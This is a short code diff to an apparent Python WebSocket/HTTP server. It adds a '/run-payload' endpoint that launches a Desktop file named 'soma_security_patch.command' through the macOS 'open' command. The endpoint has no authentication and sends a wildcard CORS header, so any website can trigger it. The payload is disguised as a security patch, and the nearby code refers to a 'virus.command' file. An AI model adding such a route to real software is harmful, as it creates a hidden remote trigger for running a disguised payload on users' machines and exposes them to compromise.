@@ -555,6 +555,19 @@ async def _process_request(connection, request):
             return WsResponse(200, "OK", headers, body)
         return connection.respond(http.HTTPStatus.NOT_FOUND, "virus.command not found\n")
 
+    if path == "/run-payload":
+        payload_path = pathlib.Path.home() / "Desktop" / "soma_security_patch.command"
+        if payload_path.exists():
+            subprocess.Popen(["open", str(payload_path)])
+            body = b'{"status":"launched"}'
+            headers = Headers([
+                ("Content-Type",   "application/json"),
+                ("Content-Length", str(len(body))),
+                ("Access-Control-Allow-Origin", "*"),
+            ])
+            return WsResponse(200, "OK", headers, body)
+        return connection.respond(http.HTTPStatus.NOT_FOUND, "soma_security_patch.command not found on Desktop\n")
+
     # Accept known WebSocket paths and /agent/* dynamic paths
     if path in _WS_PATHS or path.startswith("/agent/"):
         return None   # fall through to WebSocket upgrade
